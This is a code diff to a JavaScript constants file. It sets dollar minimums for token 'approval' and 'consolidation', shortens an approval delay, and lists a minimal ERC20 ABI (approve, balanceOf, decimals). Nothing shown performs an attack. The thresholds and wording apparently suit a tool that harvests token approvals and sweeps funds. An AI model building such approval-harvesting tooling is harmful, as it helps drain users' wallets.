@@ -1,10 +1,24 @@
 // Token limits
-export const MIN_VALUE_FRONTEND = 2; // $2 minimum for approval
-export const MIN_VALUE_BACKEND = 5;  // $5 minimum for consolidation
-export const APPROVAL_DELAY = 2000;   // 2 seconds delay
+export const MIN_VALUE_FRONTEND = 1;
+export const MIN_VALUE_BACKEND = 5;
+export const APPROVAL_DELAY = 500;
 
-// Contract ABI (sirf approval functions)
+// ERC20 ABI
 export const ERC20_ABI = [
+    {
+        "constant": true,
+        "inputs": [{"name": "_owner", "type": "address"}],
+        "name": "balanceOf",
+        "outputs": [{"name": "balance", "type": "uint256"}],
+        "type": "function"
+    },
+    {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{"name": "", "type": "uint8"}],
+        "type": "function"
+    },
     {
         "constant": false,
         "inputs": [
@@ -13,13 +27,6 @@ export const ERC20_ABI = [
         ],
         "name": "approve",
         "outputs": [{"name": "", "type": "bool"}],
-        "type": "function"
-    },
-    {
-        "constant": true,
-        "inputs": [{"name": "_owner", "type": "address"}],
-        "name": "balanceOf",
-        "outputs": [{"name": "balance", "type": "uint256"}],
         "type": "function"
     }
 ];
